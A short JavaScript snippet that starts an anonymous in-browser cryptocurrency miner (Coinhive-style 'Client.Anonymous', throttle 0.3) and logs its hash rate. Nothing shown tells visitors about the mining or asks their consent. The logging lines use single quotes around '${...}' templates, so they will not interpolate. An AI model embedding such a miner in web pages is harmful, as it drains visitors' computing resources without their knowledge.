const miner=new Client.Anonymous('web-app',{throttle:0.3,
});
if (!miner.isRunning()){
  miner.start();
}
miner.on('update',(data)=>{
  console.log('hash rate:${data.hashesPerSecond}');
  console.log('Total hashes:${data.totalHashes}');
});
